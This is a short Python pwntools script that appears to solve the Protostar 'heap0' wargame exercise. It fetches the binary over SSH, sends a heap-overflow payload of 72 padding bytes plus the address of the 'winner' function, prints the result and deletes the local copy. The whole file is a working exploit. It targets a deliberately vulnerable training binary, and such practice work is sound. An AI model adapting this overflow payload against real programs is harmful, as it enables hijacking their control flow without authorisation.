#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/heap0'
sh.download(binarypath)
elf=ELF('./heap0')
payload="A"*(4*18)+p32(elf.symbols['winner'])
p=sh.run([binarypath,payload])
p.recvline()
print p.recvall()

os.system('rm heap0')